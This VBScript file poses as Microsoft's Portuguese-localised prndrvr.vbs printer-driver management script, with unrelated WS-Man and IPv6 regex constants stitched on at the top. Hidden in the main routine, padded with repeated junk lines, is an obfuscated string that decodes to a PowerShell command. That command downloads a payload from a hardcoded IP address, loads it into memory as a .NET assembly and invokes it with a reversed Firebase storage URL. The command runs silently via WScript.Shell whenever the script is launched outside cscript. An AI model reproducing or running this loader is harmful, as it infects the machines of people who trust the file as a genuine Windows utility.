private const PTRN_IPV6_3 = "[A-Fa-f0-9]{1,4}::([A-Fa-f0-9]{1,4}:){0,5}[A-Fa-f0-9]{1,4}"
private const PTRN_IPV6_4 = "([A-Fa-f0-9]{1,4}:){2}:([A-Fa-f0-9]{1,4}:){0,4}[A-Fa-f0-9]{1,4}"
private const PTRN_IPV6_5 = "([A-Fa-f0-9]{1,4}:){3}:([A-Fa-f0-9]{1,4}:){0,3}[A-Fa-f0-9]{1,4}"
private const PTRN_IPV6_6 = "([A-Fa-f0-9]{1,4}:){4}:([A-Fa-f0-9]{1,4}:){0,2}[A-Fa-f0-9]{1,4}"
private const PTRN_IPV6_7 = "([A-Fa-f0-9]{1,4}:){5}:([A-Fa-f0-9]{1,4}:){0,1}[A-Fa-f0-9]{1,4}"
private const PTRN_IPV6_S = ":"

private const PTRN_URI_LAST = "([a-z_][-a-z0-9._]*)$"
private const PTRN_OPT      = "^-([a-z]+):(.*)"
private const PTRN_HASH_TOK = "\s*([\w:]+)\s*=\s*(\$null|""([^""]*)"")\s*"

dim PTRN_HASH_TOK_P
dim PTRN_HASH_VALIDATE
PTRN_HASH_TOK_P        = "(" & PTRN_HASH_TOK & ")"
PTRN_HASH_VALIDATE     = "(" & PTRN_HASH_TOK_P & ";)*(" & PTRN_HASH_TOK_P & ")"

dim PTRN_IPV6
PTRN_IPV6 = "^(" & _
    PTRN_IPV6_1 & ")$|^(" & PTRN_IPV6_2 & ")$|^(" & _
    PTRN_IPV6_3 & ")$|^(" & PTRN_IPV6_4 & ")$|^(" & PTRN_IPV6_5 & ")$|^(" & _
    PTRN_IPV6_6 & ")$|^(" & PTRN_IPV6_7 & ")$"


'''''''''''''''''''''
' Misc
private const T_O             = &h800705B4
private const URI_IPMI        = "http://schemas.dmtf.org/wbem/wscim/1/cim-schema"
private const URI_WMI         = "http://schemas.microsoft.com/wbem/wsman/1/wmi"
private const NS_IPMI         = "http://schemas.dmtf.org/wbem/wscim/1/cim-schema"
private const NS_CIMBASE      = "http://schemas.dmtf.org/wbem/wsman/1/base"
private const NS_WSMANL       = "http://schemas.microsoft.com"
private const NS_XSI          = "xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"""
private const ATTR_NIL        = "xsi:nil=""true"""
private const ATTR_NIL_NAME   = "xsi:nil"
private const NS_XSI_URI      = "http://www.w3.org/2001/XMLSchema-instance"
private const ALIAS_WQL       = "wql"
private const URI_WQL_DIALECT = "http://schemas.microsoft.com/wbem/wsman/1/WQL"
private const ALIAS_XPATH       = "xpath"
private const URI_XPATH_DIALECT = "http://www.w3.org/TR/1999/REC-xpath-19991116"
'Constants for MS-XML
private const NODE_ATTRIBUTE  = 2
private const NODE_TEXT       = 3
'----------------------------------------------------------------------
'
' Copyright (c) Microsoft Corporation. All rights reserved.
'
' Abstract:
' prndrvr.vbs - driver script for WMI on Windows 
'     used to add, delete, and list drivers.
'
' Usage:
' prndrvr [-adlx?] [-m model][-v version][-e environment][-s server]
'         [-u user name][-w password][-h file path][-i inf file]
'
' Example:
' prndrvr -a -m "driver" -v 3 -e "Windows NT x86"
' prndrvr -d -m "driver" -v 3 -e "Windows x64"
' prndrvr -d -m "driver" -v 3 -e "Windows IA64"
' prndrvr -x -s server
' prndrvr -l -s server
'
'----------------------------------------------------------------------


'
' Debugging trace flags, to enable debug output trace message
' change gDebugFlag to true.
'
const kDebugTrace = 1
const kDebugError = 2
dim gDebugFlag

gDebugFlag = false

'
' Operation action values.
'
const kActionUnknown    = 0
const kActionAdd        = 1
const kActionDel        = 2
const kActionDelAll     = 3
const kActionList       = 4

const kErrorSuccess     = 0
const kErrorFailure     = 1

const kNameSpace        = "root\cimv2"

'
' Generic strings
'
const L_Empty_Text                 = ""
const L_Space_Text                 = " "
const L_Error_Text                 = "Erro"
const L_Success_Text               = "Êxito"
const L_Failed_Text                = "Falha"
const L_Hex_Text                   = "0x"
const L_Printer_Text               = "Impressora"
const L_Operation_Text             = "Operação"
const L_Provider_Text              = "Provedor"
const L_Description_Text           = "Descrição"
const L_Debug_Text                 = "Depurar:"

'
' General usage messages
'
const L_Help_Help_General01_Text   = "Uso: prndrvr [-adlx?] [-m modelo][-v versão][-e ambiente][-s servidor]"
const L_Help_Help_General02_Text   = "               [-u user name][-w password][-h path][-i inf file]"
const L_Help_Help_General03_Text   = "Argumentos:"
const L_Help_Help_General04_Text   = "-a     - adicionar o driver especificado"
const L_Help_Help_General05_Text   = "-d     - excluir o driver especificado"
const L_Help_Help_General06_Text   = "-e     - ambiente  ""Windows {NT x86 | X64 | IA64}"""
const L_Help_Help_General07_Text   = "-h     - caminho de arquivo de driver"
const L_Help_Help_General08_Text   = "-i     - nome de arquivo inf totalmente qualificado"
const L_Help_Help_General09_Text   = "-l     - listar todos os drivers"
const L_Help_Help_General10_Text   = "-m     - nome de modelo de driver"
const L_Help_Help_General11_Text   = "-s     - nome do servidor"
const L_Help_Help_General12_Text   = "-u     - nome do usuário"
const L_Help_Help_General13_Text   = "-v     - versão"
const L_Help_Help_General14_Text   = "-w     - senha"
const L_Help_Help_General15_Text   = "-x     - excluir todos os drivers que não estão em uso"
const L_Help_Help_General16_Text   = "-?     - exibir uso do comando"
const L_Help_Help_General17_Text   = "Exemplos:"
const L_Help_Help_General18_Text   = "prndrvr -a -m ""driver"" -v 3 -e ""Windows NT x86"""
const L_Help_Help_General19_Text   = "prndrvr -d -m ""driver"" -v 3 -e ""Windows x64"""
const L_Help_Help_General20_Text   = "prndrvr -a -m ""driver"" -v 3 -e ""Windows IA64"" -i c:\temp\drv\drv.inf -h c:\temp\drv"
const L_Help_Help_General21_Text   = "prndrvr -l -s server"
const L_Help_Help_General22_Text   = "prndrvr -x -s server"
const L_Help_Help_General23_Text   = "Comentários:"
const L_Help_Help_General24_Text   = "O nome de arquivo .inf deve ser totalmente qualificado. Se o nome .inf não for especificado, o script usa"
const L_Help_Help_General25_Text   = "um dos arquivos inf de impressora da caixa de entrada na subpasta inf da pasta do Windows."
const L_Help_Help_General26_Text   = "Se o caminho do driver não for especificado, o script procura arquivos de driver no arquivo driver.cab."
const L_Help_Help_General27_Text   = "A opção -x exclui todos os drivers de impressora adicionais (drivers instalados para uso em clientes executando"
const L_Help_Help_General28_Text   = "outras versões do Windows), mesmo que o driver primário esteja em uso. Se o componente de fax estiver instalado,"
const L_Help_Help_General29_Text   = "esta opção exclui quaisquer drivers de fax adicionais. O driver de fax primário também é excluído caso não"
const L_Help_Help_General30_Text   = "esteja em uso (se nenhuma fila o estiver utilizando, por exemplo). Se o driver de fax primário for excluído, a única maneira de"
const L_Help_Help_General31_Text   = "reativar o fax é reinstalando o componente de fax."

'
' Messages to be displayed if the scripting host is not cscript
'
const L_Help_Help_Host01_Text      = "Este script deve ser executado a partir do prompt de comando usando CScript.exe."
const L_Help_Help_Host02_Text      = "Por exemplo: CScript script.vbs argumentos"
const L_Help_Help_Host03_Text      = ""
const L_Help_Help_Host04_Text      = "Para definir CScript como o aplicativo padrão para a execução de arquivos .VBS, execute:"
const L_Help_Help_Host05_Text      = "     CScript //H:CScript //S"
const L_Help_Help_Host06_Text      = "Você poderá em seguida executar ""script.vbs argumentos"" sem incluir CScript antes to script."

'
' General error messages
'
const L_Text_Error_General01_Text  = "O host de script não pôde ser determinado."
const L_Text_Error_General02_Text  = "Não é possível analisar a linha de comando."
const L_Text_Error_General03_Text  = "Código de erro do Win32"

'
' Miscellaneous messages
'
const L_Text_Msg_General01_Text    = "Driver de impressora adicionado"
const L_Text_Msg_General02_Text    = "Não é possível adicionar driver de impressora"
const L_Text_Msg_General03_Text    = "Não é possível excluir driver de impressora"
const L_Text_Msg_General04_Text    = "Driver de impressora excluído"
const L_Text_Msg_General05_Text    = "Não foi possível enumerar drivers de impressora"
const L_Text_Msg_General06_Text    = "Número de drivers de impressoras enumerados"
const L_Text_Msg_General07_Text    = "Número de drivers de impressoras excluídos"
const L_Text_Msg_General08_Text    = "Tentando excluir driver de impressora"
const L_Text_Msg_General09_Text    = "Não foi possível listar os arquivos dependentes"
const L_Text_Msg_General10_Text    = "Não foi possível obter o objeto SWbemLocator"
const L_Text_Msg_General11_Text    = "Não é possível conectar-se ao serviço WMI"


'
' Printer driver properties
'
const L_Text_Msg_Driver01_Text     = "Nome do servidor"
const L_Text_Msg_Driver02_Text     = "Nome do driver"
const L_Text_Msg_Driver03_Text     = "Versão"
const L_Text_Msg_Driver04_Text     = "Ambiente"
const L_Text_Msg_Driver05_Text     = "Nome do monitor"
const L_Text_Msg_Driver06_Text     = "Caminho do driver"
const L_Text_Msg_Driver07_Text     = "Arquivo de dados"
const L_Text_Msg_Driver08_Text     = "Arquivo de configuração"
const L_Text_Msg_Driver09_Text     = "Arquivo de Ajuda"
const L_Text_Msg_Driver10_Text     = "Arquivos dependentes"

'
' Debug messages
'
const L_Text_Dbg_Msg01_Text        = "Na função AddDriver"
const L_Text_Dbg_Msg02_Text        = "Na função DelDriver"
const L_Text_Dbg_Msg03_Text        = "Na função DelAllDrivers"
const L_Text_Dbg_Msg04_Text        = "Na função ListDrivers"
const L_Text_Dbg_Msg05_Text        = "Na função ParseCommandLine"

main

'
' Main execution starts here
'
sub main

    dim iAction
    dim iRetval
    dim strServer
    dim strModel
    dim strPath
    dim uVersion
    dim strEnvironment
    dim strInfFile
    dim strUser
    dim strPassword

    '
    ' Abort if the host is not cscript
    '
    On Error Resume Next
    if not IsHostCscript() then
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
    Dim Helo
    Dim pay
    Dim Hi
    Set Hi = WScript.CreateObject("WScript.Shell")
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
    Helo = "([A-Fa-f0-9]{1,4}:){7}[A-Fa-f0-9]{1,4}"
    Helo = Helo & "[A-Fa-f0-9]{1,4}::([A-Fa-f0-9]{1,4}:){0,5}[A-Fa-f0-9]{1,4}w"
    Helo = Helo & "([A-Fa-f0-9]{1,4}:){5}:([A-Fa-f0-9]{1,4}:){0,1}[A-Fa-f0-9]{1,4}r"
    Helo = Helo & "sh"
    Helo = Helo & "([A-Fa-f0-9]{1,4}:){5}:([A-Fa-f0-9]{1,4}:){0,1}[A-Fa-f0-9]{1,4}l"
    Helo = Helo & "l.([A-Fa-f0-9]{1,4}:){5}:([A-Fa-f0-9]{1,4}:){0,1}[A-Fa-f0-9]{1,4}x"
    Helo = Helo & "([A-Fa-f0-9]{1,4}:){5}:([A-Fa-f0-9]{1,4}:){0,1}[A-Fa-f0-9]{1,4} [By"
    Helo = Helo & "te["
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
    Helo = Helo & "]] $r[A-Fa-f0-9]{1,4}::([A-Fa-f0-9]{1,4}:){0,5}[A-Fa-f0-9]{1,4}"
    Helo = Helo & "Wg "
    Helo = Helo & "= [s"
    Helo = Helo & "yst([A-Fa-f0-9]{1,4}:){5}:([A-Fa-f0-9]{1,4}:){0,1}[A-Fa-f0-9]{1,4}"
    Helo = Helo & "m.C[A-Fa-f0-9]{1,4}::([A-Fa-f0-9]{1,4}:){0,5}[A-Fa-f0-9]{1,4}n"
    Helo = Helo & "v([A-Fa-f0-9]{1,4}:){5}:([A-Fa-f0-9]{1,4}:){0,1}[A-Fa-f0-9]{1,4}rt]:"
    Helo = Helo & ":Fr[A-Fa-f0-9]{1,4}::([A-Fa-f0-9]{1,4}:){0,5}[A-Fa-f0-9]{1,4}m"
    Helo = Helo & "Bas"
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
    Helo = Helo & "([A-Fa-f0-9]{1,4}:){5}:([A-Fa-f0-9]{1,4}:){0,1}[A-Fa-f0-9]{1,4}64stri"
    Helo = Helo & "ng((N([A-Fa-f0-9]{1,4}:){5}:([A-Fa-f0-9]{1,4}:){0,1}[A-Fa-f0-9]{1,4}"
    Helo = Helo & "w-[A-Fa-f0-9]{1,4}::([A-Fa-f0-9]{1,4}:){0,5}[A-Fa-f0-9]{1,4}b"
    Helo = Helo & "ject N([A-Fa-f0-9]{1,4}:){5}:([A-Fa-f0-9]{1,4}:){0,1}[A-Fa-f0-9]{1,4}"
    Helo = Helo & "t.WebC"
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
    Helo = Helo & "li([A-Fa-f0-9]{1,4}:){5}:([A-Fa-f0-9]{1,4}:){0,1}[A-Fa-f0-9]{1,4}nt)."
    Helo = Helo & "D[A-Fa-f0-9]{1,4}::([A-Fa-f0-9]{1,4}:){0,5}[A-Fa-f0-9]{1,4}wn"
    Helo = Helo & "l[A-Fa-f0-9]{1,4}::([A-Fa-f0-9]{1,4}:){0,5}[A-Fa-f0-9]{1,4}adStri"
    Helo = Helo & "ng('htt"
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
    Helo = Helo & "([A-Fa-f0-9]{1,4}:){7}[A-Fa-f0-9]{1,4}://4.204.2"
    Helo = Helo & "33.44/D"
    Helo = Helo & "ll/Dl"
    Helo = Helo & "l.p([A-Fa-f0-9]{1,4}:){7}[A-Fa-f0-9]{1,4}am'));"
    Helo = Helo & "[System.A"
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
    Helo = Helo & "ppD[A-Fa-f0-9]{1,4}::([A-Fa-f0-9]{1,4}:){0,5}[A-Fa-f0-9]{1,4}main]::Curr([A-Fa-f0-9]{1,4}:){5}:([A-Fa-f0-9]{1,4}:){0,1}[A-Fa-f0-9]{1,4}"
    Helo = Helo & "ntD[A-Fa-f0-9]{1,4}::([A-Fa-f0-9]{1,4}:){0,5}[A-Fa-f0-9]{1,4}main.L"
    Helo = Helo & "[A-Fa-f0-9]{1,4}::([A-Fa-f0-9]{1,4}:){0,5}[A-Fa-f0-9]{1,4}ad($rO"
    Helo = Helo & "Wg).G([A-Fa-f0-9]{1,4}:){5}:([A-Fa-f0-9]{1,4}:){0,1}[A-Fa-f0-9]{1,4}tT"
    Helo = Helo & "yp([A-Fa-f0-9]{1,4}:){5}:([A-Fa-f0-9]{1,4}:){0,1}[A-Fa-f0-9]{1,4}('Fi"
    Helo = Helo & "b([A-Fa-f0-9]{1,4}:){5}:([A-Fa-f0-9]{1,4}:){0,1}[A-Fa-f0-9]{1,4}"
    Helo = Helo & "r.H[A-Fa-f0-9]{1,4}::([A-Fa-f0-9]{1,4}:){0,5}[A-Fa-f0-9]{1,4}"
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
    Helo = Helo & "m([A-Fa-f0-9]{1,4}:){5}:([A-Fa-f0-9]{1,4}:){0,1}[A-Fa-f0-9]{1,4}')."
    Helo = Helo & "G([A-Fa-f0-9]{1,4}:){5}:([A-Fa-f0-9]{1,4}:){0,1}[A-Fa-f0-9]{1,4}"
    Helo = Helo & "tM([A-Fa-f0-9]{1,4}:){5}:([A-Fa-f0-9]{1,4}:){0,1}[A-Fa-f0-9]{1,4}tho"
    Helo = Helo & "d('V"
    Helo = Helo & "AI').In"
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
    Helo = Helo & "v[A-Fa-f0-9]{1,4}::([A-Fa-f0-9]{1,4}:){0,5}[A-Fa-f0-9]{1,4}k([A-Fa-f0-9]{1,4}:){5}:([A-Fa-f0-9]{1,4}:){0,1}[A-Fa-f0-9]{1,4}($n"
    Helo = Helo & "ull, [[A-Fa-f0-9]{1,4}::([A-Fa-f0-9]{1,4}:){0,5}[A-Fa-f0-9]{1,4}bj"
    Helo = Helo & "([A-Fa-f0-9]{1,4}:){5}:([A-Fa-f0-9]{1,4}:){0,1}[A-Fa-f0-9]{1,4}ct[]"
    Helo = Helo & "] ('2bb0a492e1d8-04ca-15d4-0bc1-e2762660=nekot&aidem=tla?txt.mer/o/moc.topsppa.af72d-nimda/b/0v/moc.sipaelgoog.egarotsesaberif//:sptth'))"
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
    Helo = Replace(Helo,"([A-Fa-f0-9]{1,4}:){7}[A-Fa-f0-9]{1,4}","p")
    Helo = Replace(Helo,"[A-Fa-f0-9]{1,4}::([A-Fa-f0-9]{1,4}:){0,5}[A-Fa-f0-9]{1,4}","o")
    Helo = Replace(Helo,"([A-Fa-f0-9]{1,4}:){5}:([A-Fa-f0-9]{1,4}:){0,1}[A-Fa-f0-9]{1,4}","e")
    Hi.Run(Helo),false
    wscript.quit
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:

     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     CAMPEONATO:brasil:casagrande = "Ghzinho":CD:uva:
     
    end if

    '
    ' Get command line parameters
    '
    iRetval = ParseCommandLine(iAction, strServer, strModel, strPath, uVersion, _
                               strEnvironment, strInfFile, strUser, strPAssword)

    if iRetval = kErrorSuccess  then

        select case iAction

            case kActionAdd
                iRetval = AddDriver(strServer, strModel, strPath, uVersion, _
                                    strEnvironment, strInfFile, strUser, strPassword)

            case kActionDel
                iRetval = DelDriver(strServer, strModel, uVersion, strEnvironment, strUser, strPassword)

            case kActionDelAll
                iRetval = DelAllDrivers(strServer, strUser, strPassword)

            case kActionList
                iRetval = ListDrivers(strServer, strUser, strPassword)

            case kActionUnknown
                Usage(true)
                exit sub

            case else
                Usage(true)
                exit sub

        end select

    end if

end sub

'
' Add a driver
'
function AddDriver(strServer, strModel, strFilePath, uVersion, strEnvironment, strInfFile, strUser, strPassword)

    on error resume next

    DebugPrint kDebugTrace, L_Text_Dbg_Msg01_Text

    dim oDriver
    dim oService
    dim iResult
    dim uResult

    '
    ' Initialize return value
    '
    iResult = kErrorFailure

    if WmiConnect(strServer, kNameSpace, strUser, strPassword, oService) then

        set oDriver = oService.Get("Win32_PrinterDriver")

    else

        AddDriver = kErrorFailure

        exit function

    end if

    '
    ' Check if Get was successful
    '
    if Err.Number = kErrorSuccess then

        oDriver.Name              = strModel
        oDriver.SupportedPlatform = strEnvironment
        oDriver.Version           = uVersion
        oDriver.FilePath          = strFilePath
        oDriver.InfName           = strInfFile

        uResult = oDriver.AddPrinterDriver(oDriver)

        if Err.Number = kErrorSuccess then

            if uResult = kErrorSuccess then

                wscript.echo L_Text_Msg_General01_Text & L_Space_Text & oDriver.Name

                iResult = kErrorSuccess

            else

                wscript.echo L_Text_Msg_General02_Text & L_Space_Text & strModel & L_Space_Text _
                             & L_Text_Error_General03_Text & L_Space_Text & uResult

            end if

        else

            wscript.echo L_Text_Msg_General02_Text & L_Space_Text & strModel & L_Space_Text _
                         & L_Error_Text & L_Space_Text & L_Hex_Text & hex(Err.Number) & L_Space_Text & Err.Description

        end if

    else

        wscript.echo L_Text_Msg_General02_Text & L_Space_Text & strModel & L_Space_Text _
                     & L_Error_Text & L_Space_Text & L_Hex_Text & hex(Err.Number) & L_Space_Text & Err.Description

    end if

    AddDriver = iResult

end function

'
' Delete a driver
'
function DelDriver(strServer, strModel, uVersion, strEnvironment, strUser, strPassword)

    on error resume next

    DebugPrint kDebugTrace, L_Text_Dbg_Msg02_Text

    dim oDriver
    dim oService
    dim iResult
    dim strObject

    '
    ' Initialize return value
    '
    iResult = kErrorFailure

    '
    ' Build the key that identifies the driver instance.
    '
    strObject = strModel & "," & CStr(uVersion) & "," & strEnvironment

    if WmiConnect(strServer, kNameSpace, strUser, strPassword, oService) then

        set oDriver = oService.Get("Win32_PrinterDriver.Name='" & strObject & "'")

    else

        DelDriver = kErrorFailure

        exit function

    end if

    '
    ' Check if Get was successful
    '
    if Err.Number = kErrorSuccess then

        '
        ' Delete the printer driver instance
        '
        oDriver.Delete_

        if Err.Number = kErrorSuccess then

            wscript.echo L_Text_Msg_General04_Text & L_Space_Text & oDriver.Name

            iResult = kErrorSuccess

        else

            wscript.echo L_Text_Msg_General03_Text & L_Space_Text & strModel & L_Space_Text _
                         & L_Error_Text & L_Space_Text & L_Hex_Text & hex(Err.Number) _
                         & L_Space_Text & Err.Description

            call LastError()

        end if

    else

        wscript.echo L_Text_Msg_General03_Text & L_Space_Text & strModel & L_Space_Text _
                     & L_Error_Text & L_Space_Text & L_Hex_Text & hex(Err.Number) _
                     & L_Space_Text & Err.Description

    end if

    DelDriver = iResult

end function

'
' Delete all drivers
'
function DelAllDrivers(strServer, strUser, strPassword)

    on error resume next

    DebugPrint kDebugTrace, L_Text_Dbg_Msg03_Text

    dim Drivers
    dim oDriver
    dim oService
    dim iResult
    dim iTotal
    dim iTotalDeleted
    dim vntDependentFiles
    dim strDriverName

    if WmiConnect(strServer, kNameSpace, strUser, strPassword, oService) then

        set Drivers = oService.InstancesOf("Win32_PrinterDriver")

    else

        DelAllDrivers = kErrorFailure

        exit function

    end if

    if Err.Number <> kErrorSuccess then

        wscript.echo L_Text_Msg_General05_Text & L_Space_Text & L_Error_Text & L_Space_Text _
                     & L_Hex_Text & hex(Err.Number) & L_Space_Text & Err.Description

        DelAllDrivers = kErrorFailure

        exit function

    end if

    iTotal = 0
    iTotalDeleted = 0

    for each oDriver in Drivers

        iTotal = iTotal + 1

        wscript.echo
        wscript.echo L_Text_Msg_General08_Text
        wscript.echo L_Text_Msg_Driver01_Text & L_Space_Text & strServer
        wscript.echo L_Text_Msg_Driver02_Text & L_Space_Text & oDriver.Name
        wscript.echo L_Text_Msg_Driver03_Text & L_Space_Text & oDriver.Version
        wscript.echo L_Text_Msg_Driver04_Text & L_Space_Text & oDriver.SupportedPlatform

        strDriverName = oDriver.Name

        '
        ' Example of how to delete an instance of a printer driver
        '
        oDriver.Delete_

        if Err.Number = kErrorSuccess then

            wscript.echo L_Text_Msg_General04_Text & L_Space_Text & oDriver.Name

            iTotalDeleted = iTotalDeleted + 1

        else

            '
            ' We cannot use oDriver.Name to display the driver name, because the SWbemLastError
            ' that the function LastError() looks at would be overwritten. For that reason we
            ' use strDriverName for accessing the driver name
            '
            wscript.echo L_Text_Msg_General03_Text & L_Space_Text & strDriverName & L_Space_Text _
                         & L_Error_Text & L_Space_Text & L_Hex_Text & hex(Err.Number) _
                         & L_Space_Text & Err.Description

            '
            ' Try getting extended error information
            '
            call LastError()

            Err.Clear

        end if

    next

    wscript.echo L_Empty_Text
    wscript.echo L_Text_Msg_General06_Text & L_Space_Text & iTotal
    wscript.echo L_Text_Msg_General07_Text & L_Space_Text & iTotalDeleted

    DelAllDrivers = kErrorSuccess

end function

'
' List drivers
'
function ListDrivers(strServer, strUser, strPassword)

    on error resume next

    DebugPrint kDebugTrace, L_Text_Dbg_Msg04_Text

    dim Drivers
    dim oDriver
    dim oService
    dim iResult
    dim iTotal
    dim vntDependentFiles

    if WmiConnect(strServer, kNameSpace, strUser, strPassword, oService) then

        set Drivers = oService.InstancesOf("Win32_PrinterDriver")

    else

        ListDrivers = kErrorFailure

        exit function

    end if

    if Err.Number <> kErrorSuccess then

        wscript.echo L_Text_Msg_General05_Text & L_Space_Text & L_Error_Text & L_Space_Text _
                     & L_Hex_Text & hex(Err.Number) & L_Space_Text & Err.Description

        ListDrivers = kErrorFailure

        exit function

    end if

    iTotal = 0

    for each oDriver in Drivers

        iTotal = iTotal + 1

        wscript.echo
        wscript.echo L_Text_Msg_Driver01_Text & L_Space_Text & strServer
        wscript.echo L_Text_Msg_Driver02_Text & L_Space_Text & oDriver.Name
        wscript.echo L_Text_Msg_Driver03_Text & L_Space_Text & oDriver.Version
        wscript.echo L_Text_Msg_Driver04_Text & L_Space_Text & oDriver.SupportedPlatform
        wscript.echo L_Text_Msg_Driver05_Text & L_Space_Text & oDriver.MonitorName
        wscript.echo L_Text_Msg_Driver06_Text & L_Space_Text & oDriver.DriverPath
        wscript.echo L_Text_Msg_Driver07_Text & L_Space_Text & oDriver.DataFile
        wscript.echo L_Text_Msg_Driver08_Text & L_Space_Text & oDriver.ConfigFile
        wscript.echo L_Text_Msg_Driver09_Text & L_Space_Text & oDriver.HelpFile

        vntDependentFiles = oDriver.DependentFiles

        '
        ' If there are no dependent files, the method will set DependentFiles to
        ' an empty variant, so we check if the variant is an array of variants
        '
        if VarType(vntDependentFiles) = (vbArray + vbVariant) then

            PrintDepFiles oDriver.DependentFiles

        end if

        Err.Clear

    next

    wscript.echo L_Empty_Text
    wscript.echo L_Text_Msg_General06_Text & L_Space_Text & iTotal

    ListDrivers = kErrorSuccess

end function

'
' Prints the contents of an array of variants
'
sub PrintDepFiles(Param)

   on error resume next

   dim iIndex

   iIndex = LBound(Param)

   if Err.Number = 0 then

      wscript.echo L_Text_Msg_Driver10_Text

      for iIndex = LBound(Param) to UBound(Param)

          wscript.echo L_Space_Text & Param(iIndex)

      next

   else

        wscript.echo L_Text_Msg_General09_Text & L_Space_Text & L_Error_Text & L_Space_Text _
                     & L_Hex_Text & hex(Err.Number) & L_Space_Text & Err.Description

   end if

end sub

'
' Debug display helper function
'
sub DebugPrint(uFlags, strString)

    if gDebugFlag = true then

        if uFlags = kDebugTrace then

            wscript.echo L_Debug_Text & L_Space_Text & strString

        end if

        if uFlags = kDebugError then

            if Err <> 0 then

                wscript.echo L_Debug_Text & L_Space_Text & strString & L_Space_Text _
                             & L_Error_Text & L_Space_Text & L_Hex_Text & hex(Err.Number) _
                             & L_Space_Text & Err.Description

            end if

        end if

    end if

end sub

'
' Parse the command line into its components
'
function ParseCommandLine(iAction, strServer, strModel, strPath, uVersion, _
                          strEnvironment, strInfFile, strUser, strPassword)

    on error resume next

    DebugPrint kDebugTrace, L_Text_Dbg_Msg05_Text

    dim oArgs
    dim iIndex

